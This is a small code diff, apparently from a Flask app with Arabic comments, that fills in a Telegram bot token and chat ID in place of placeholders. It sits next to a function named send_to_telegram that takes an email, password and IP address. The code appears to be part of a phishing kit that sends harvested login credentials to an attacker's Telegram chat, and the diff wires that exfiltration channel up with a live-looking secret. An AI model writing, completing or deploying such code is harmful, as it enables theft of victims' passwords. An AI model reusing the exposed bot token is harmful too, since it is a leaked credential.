@@ -6,8 +6,8 @@ app = Flask(__name__)
 
 # ---------------- إعدادات تيليجرام ----------------
 # ضع التوكن والايدي الخاص بك هنا
-TELEGRAM_TOKEN = "ضع_التوكن_هنا"
-CHAT_ID = "ضع_الايدي_هنا"
+TELEGRAM_TOKEN = "8629856601:AAGp5i4FH27hJ24bhr7RsSCIGi1TZvGi8no"
+CHAT_ID = "8988121334"
 
 def send_to_telegram(email, password, ip):
     time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
